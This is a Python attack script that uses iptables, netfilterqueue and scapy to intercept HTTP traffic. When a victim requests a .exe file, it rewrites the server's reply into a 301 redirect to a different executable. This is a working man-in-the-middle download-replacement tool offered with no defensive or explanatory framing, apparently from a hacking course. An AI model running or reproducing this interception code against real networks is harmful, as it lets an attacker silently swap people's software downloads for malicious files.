import netfilterqueue
import scapy.all as scapy
import subprocess

ack_list=[]
def file_interceptor(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print("[+] .exe requested")
                print("[+] Intercepting File..")
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: http://www.tucows.com/download/windows/files4/3dbve_t.exe\n\n"
                print("[+]Redirecting file")
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))

    packet.accept()


subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
packet = netfilterqueue.NetfilterQueue()
packet.bind(0, file_interceptor)
packet.run()
